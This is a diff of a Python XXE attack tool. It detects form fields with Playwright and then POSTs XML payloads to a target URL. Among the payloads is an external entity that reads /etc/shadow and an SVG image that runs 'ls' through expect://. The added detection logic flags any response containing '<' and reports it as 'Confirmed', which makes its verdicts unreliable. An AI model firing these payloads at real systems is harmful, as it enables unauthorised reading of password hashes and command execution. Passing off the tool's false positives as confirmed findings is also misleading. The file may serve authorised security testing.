@@ -8,23 +8,25 @@ async def xxe_attack(target_url):
 
     async def detect_fields(url):
 
-        #Detects input, textarea, and select fields on a web page.
+        #Detects input, textarea, select fields, and forms on a web page.
 
         async with async_playwright() as p:
             browser = await p.chromium.launch(headless=True)
             page = await browser.new_page()
-
             try:
+                # Navigate to the target URL and wait for the page to fully load
                 await page.goto(url)
                 await page.wait_for_load_state("networkidle")
                 selectors = ["input", "textarea", "select", "form"]
                 detected_fields = {}
-
+                
+                # Loop through the predefined selectors to identify fields
                 for selector in selectors:
                     elements = await page.query_selector_all(selector)
                     for element in elements:
                         field_name = await element.get_attribute("name")
                         field_id = await element.get_attribute("id")
+                        # Save the field's ID, name, and tag
                         detected_fields[field_id or field_name or selector] = {
                             "id": field_id,
                             "name": field_name,
@@ -32,18 +34,27 @@ async def xxe_attack(target_url):
                         }
                 return detected_fields
             finally:
+                # Close the browser after processing
                 await browser.close()
 
     def test_xxe(url):
 
-        #Tests the target URL for XXE vulnerabilities using a set of payloads.
+        #Tests the target URL for XXE vulnerabilities using various payloads.
 
         xxe_payloads = [
-            # XXE: File Disclosure
+          # XXE: Entity Example
+        """<?xml version="1.0"?>
+        <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+        <userInfo>
+          <firstName>John</firstName>
+          <lastName>&example;</lastName>
+        </userInfo>""",
+
+        # XXE: File Disclosure
         """<?xml version="1.0"?>
         <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
         <userInfo>
-          <firstName>John</firstName>
+          <firstName>admin</firstName>
           <lastName>&ent;</lastName>
         </userInfo>""",
 
@@ -116,33 +127,58 @@ async def xxe_attack(target_url):
         """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
             <image xlink:href="expect://ls"></image>
         </svg>""",
-        ]
+    ]
 
         headers = {"Content-Type": "application/xml"}
         results = []
 
+        # Loop through each payload and send it to the target URL
         for i, payload in enumerate(xxe_payloads):
             try:
+                print(f"\nTesting XXE payload {i+1}:\n{payload}")
                 response = requests.post(url, data=payload, headers=headers)
+                print(f"Response Code: {response.status_code}")
+                
+                # Check if the response indicates a potential XXE vulnerability
+                if "Error" in response.text or "Exception" in response.text or "<" in response.text:
+                    print("Potential XXE vulnerability detected:")
+                    print(response.text[:500])  # Limit the output to avoid overloading logs
+                    results.append({
+                        "payload": f"XXE Payload {i+1}",
+                        "response_code": response.status_code,
+                        "error_exposed": True,
+                        "response_preview": response.text[:500]
+                    })
+                else:
+                    print("No XXE vulnerability detected.")
+                    results.append({
+                        "payload": f"XXE Payload {i+1}",
+                        "response_code": response.status_code,
+                        "error_exposed": False
+                    })
+            except requests.exceptions.RequestException as e:
+                # Log the error if the request fails
+                print(f"Error while sending request: {e}")
                 results.append({
                     "payload": f"XXE Payload {i+1}",
-                    "response_code": response.status_code,
-                    "error_exposed": "Error" in response.text or "Exception" in response.text
+                    "error": str(e)
                 })
-            except requests.exceptions.RequestException as e:
-                results.append({"payload": f"XXE Payload {i+1}", "error": str(e)})
 
         return results
 
-    # Step 1: Field detection
+    # Step 1: Detect fields in the target URL
     fields = await detect_fields(target_url)
     if not fields:
         return {"message": "No fields detected.", "vulnerable": False}
 
-    # Step 2: XXE vulnerability testing
+    # Step 2: Test for XXE vulnerabilities using the payloads
     results = test_xxe(target_url)
 
-    # Summarize vulnerabilities
+    # Summarize the results
     vulnerable = any(result.get("error_exposed", False) for result in results)
-    message = "XXE vulnerabilities detected." if vulnerable else "No XXE vulnerabilities detected."
+    if vulnerable:
+        message = "Confirmed XXE vulnerabilities detected!"
+    else:
+        message = "No XXE vulnerabilities detected."
+
     return {"message": message, "details": results, "vulnerable": vulnerable}
